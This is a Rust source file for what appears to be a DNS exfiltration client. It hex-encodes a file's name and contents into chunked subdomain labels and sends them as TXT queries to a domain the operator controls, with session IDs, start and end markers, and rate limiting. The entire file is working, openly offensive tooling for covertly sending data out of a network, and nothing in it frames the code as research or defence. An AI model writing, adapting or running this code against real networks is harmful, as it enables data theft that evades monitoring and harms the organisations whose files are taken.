use crate::error::DnsexError;
use hickory_client::client::{AsyncClient, ClientHandle};
use hickory_proto::rr::{DNSClass, Name, RData, RecordType};
use hickory_proto::udp::UdpClientStream;
use rand::Rng;
use std::net::SocketAddr;
use std::str::FromStr;
use tokio::net::UdpSocket as TokioUdpSocket;
use tokio::time::{Duration, sleep};

const CHUNK_SIZE: usize = 30;

#[derive(Clone, Debug)]
pub struct ExfilPayload {
    pub filename: String,
    pub data: Vec<u8>,
}

#[derive(Debug, Clone)]
pub struct ClientConfig {
    pub domain: String,
    pub resolver_ip: String,
    pub port: u16,
    pub rate_limit_ms: u64,
}

pub struct Client {
    config: ClientConfig,
}

impl Client {
    pub fn new(config: ClientConfig) -> Self {
        Self { config }
    }

    fn generate_session_id() -> String {
        let n: u16 = rand::thread_rng().r#gen();
        format!("{:04x}", n)
    }

    fn build_fqdn(&self, hex_data: &str, seq: usize, id: &str, flag: char) -> String {
        format!(
            "{}.{}.{}.{}.{}",
            hex_data, seq, id, flag, self.config.domain
        )
    }

    async fn get_client(&self) -> Result<AsyncClient, DnsexError> {
        let addr_str = format!("{}:{}", self.config.resolver_ip, self.config.port);
        let name_server: SocketAddr = addr_str
            .parse()
            .map_err(|_| DnsexError::ConfigError(format!("Invalid resolver IP: {}", addr_str)))?;

        let stream = UdpClientStream::<TokioUdpSocket>::new(name_server);
        let (client, background_task) = AsyncClient::connect(stream).await?;

        tokio::spawn(background_task);
        Ok(client)
    }

    pub async fn send_payload(&self, payload: ExfilPayload) -> Result<(), DnsexError> {
        let mut client = self.get_client().await?;
        let session_id = Client::generate_session_id();
        let total_chunks = payload.data.chunks(CHUNK_SIZE).count();

        println!(
            "exfiltrating {} chunks to {}",
            total_chunks, self.config.domain
        );

        // init
        let init_fqdn = self.build_fqdn(
            &hex::encode(&payload.filename),
            total_chunks,
            &session_id,
            'i',
        );

        self.send_query(&mut client, &init_fqdn).await?;

        // data
        for (seq, chunk) in payload.data.chunks(CHUNK_SIZE).enumerate() {
            let hex_data = hex::encode(chunk);
            let data_fqdn = format!(
                "{}.{}.{}.d.{}",
                hex_data, seq, session_id, self.config.domain
            );

            println!("Sending chunk {}/{}: {}", seq + 1, total_chunks, data_fqdn);
            self.send_query(&mut client, &data_fqdn).await?;
        }

        // fin
        let fin_hex = hex::encode("EOF");
        let fin_fqdn = format!(
            "{}.{}.{}.f.{}",
            fin_hex, total_chunks, session_id, self.config.domain
        );

        println!("Sending FIN packet: {}", fin_fqdn);
        self.send_query(&mut client, &fin_fqdn).await?;

        println!("done.");
        Ok(())
    }

    async fn send_query(&self, client: &mut AsyncClient, fqdn: &str) -> Result<(), DnsexError> {
        let domain_name = Name::from_str(fqdn)?;

        let response = client
            .query(domain_name, DNSClass::IN, RecordType::TXT)
            .await?;

        if response.answers().is_empty() {
            println!("Response code: {}", response.response_code());
        } else {
            for answer in response.answers() {
                if let Some(RData::TXT(txt)) = answer.data() {
                    println!("Server ACK: {}", txt);
                }
            }
        }

        sleep(Duration::from_millis(self.config.rate_limit_ms)).await;
        Ok(())
    }
}
